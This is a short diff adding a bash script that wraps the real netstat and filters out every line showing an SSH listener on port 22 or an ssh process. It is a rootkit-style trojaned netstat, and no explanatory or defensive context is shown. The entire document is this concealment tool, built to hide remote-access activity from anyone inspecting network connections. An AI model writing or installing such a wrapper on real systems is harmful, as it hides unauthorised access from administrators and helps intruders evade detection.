@@ -1,0 +1,5 @@
+#!/bin/bash
+
+REAL_NETSTAT=/bin/netstat
+
+$REAL_NETSTAT "$@" | grep -v " :22 .*0.0.0.0:" | grep -v "/ssh "
